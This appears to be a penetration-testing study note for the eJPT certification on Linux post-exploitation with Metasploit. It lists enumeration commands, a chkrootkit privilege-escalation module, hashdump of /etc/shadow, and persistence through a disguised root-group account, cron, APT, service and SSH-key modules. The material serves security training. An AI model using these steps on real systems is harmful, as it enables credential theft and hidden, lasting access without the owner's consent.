# 37 Linux Post Exploitation

# Linux Post Exploitation Modules

- The MSF provides us with various post exploitation modules for both Windows and Linux
- We can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to:
	- Enumerate system configuration
	- Enumerate environment variables
	- Enumerate network configuration
	- VM check
	- Enumerate user history

### DEMO

```shell
msf6: session -u <Id> # Upgrade shell to meterpreter

meterpreter: shell 
/bin/bash -i # Spwn a bash
cat /etc/passwd # Enum user
groups root # Member in root group
cat /etc/*issue # Distribution release
uname -r # Kernel version
uname -a # Hostname, kernel version, architecture 
ifconfig or ip a s # Network enum
netstat -antp # Services listening on open ports 
ps aux # Processes on system 
env # Environment variables

msf6: loot 
msf6: notes
msf6: post(linux/gather/enum_configs) # Enum configuration files
msf6: post(multi/gather/env) # Environment variables
msf6: post(linux/gather/enum_network)
msf6: post(linux/gather/enum_protections) # Check if hardening machanism are in place
msf6: post(linux/gather/enum_system) # Gather system information
msf6: post(linux/gather/checkcontainer)
msf6: post(linux/gather/checkvm)
msf6: post(linux/gather/enum_users_history) # Log of commands used by users
```


# Linux Privilege Escalation: Exploiting a Vulnerable Program

- The privilege escalation techniques we can utilize will depend on the version of the Linux kernel running on the target system as well as the distribution release version
- MSF offers cary little in regards to Linux kernel exploit modules, however, in some cases, there may be an exploit module that can be utilized to exploit a vulnerable service or program in order to elevate our privileges

### DEMO

```shell
meterpreter: shell
/bin/bash -i
ps aux
# Search for /bin/check-down,
# cat /bin/check-down, it's script with while cycle chkrootkit
# chkrootkit it's anti-rookit and it's vulnerable to privilege escalation < 0.5.0
# chkrootkit -V 
msf6: exploit(unix/local/chkrootkit)
```


# Dumping Hashes with Hashdump

- We can dump Linux user hashes with the hashdump post exploitation module
- Linux password hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges
- The hashdump module can be used to dump the user account hashes from the /etc/shadow file and can also be used to unshadow the hashes for password cracking with John the Ripper

### DEMO

```shell
# First get a meterpreter session with privileged user
msf6: post(linux/gather/hashdump)
msf6: loot
```


# Establishing Persistence on Linux

- Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access
- Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets
- The persistence techniques we can utilize will depend on the target configuration
- We can utilize various post exploitation persistence modules to ensure that we always have access to the target system

### DEMO

```shell
# Work if ssh or remote access protocol is running 
# Meterpreter session with privileged user
meterpreter: shell
/bin/bash -i
# Create clandestine user account, look like a service account
# Usually service account use /usr/sbin/nologin
# Can specify home directory for this account
useradd -m <service-like-name> -s /bin/bash
passwd <service-like-name>
usermod -aG root <service-like-name> # Add user to root group
usermod -u <id> # Change user id

msf6: exploit(linux/local/apt_package_manager_persistence) # APT packet manager persistence
msf6: exploit(linux/local/cron_persistence) 
msf6: exploit(linux/local/service_persistence) 

msf6: post(linux/manage/sshkey_persistence) # Good
msf6: loot
nano <ssh_key> # Save the sshkey in a file
chmod 0400 <ssh_key> 
ssh -i <ssh_key> <user>@<ip>
```

#eJPT #cybersecurity 